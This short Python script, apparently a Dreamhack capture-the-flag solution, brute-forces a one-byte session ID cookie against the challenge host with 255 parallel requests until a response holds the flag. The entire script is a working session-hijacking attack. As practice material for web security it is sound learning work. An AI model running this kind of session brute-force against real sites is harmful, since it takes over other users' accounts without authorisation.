from concurrent.futures import ThreadPoolExecutor
import requests
import re

HOST = "http://host1.dreamhack.games"
PORT = 12345

with ThreadPoolExecutor(max_workers=0xFF) as executor:
    results = executor.map(
        lambda i: requests.get(f"{HOST}:{PORT}/", cookies={"sessionid": f"{i:02x}"}),
        range(0, 0xFF),
    )
    for result in results:
        res = re.search(r"DH\{.*\}", result.text)
        if res:
            print(res.group())
            break
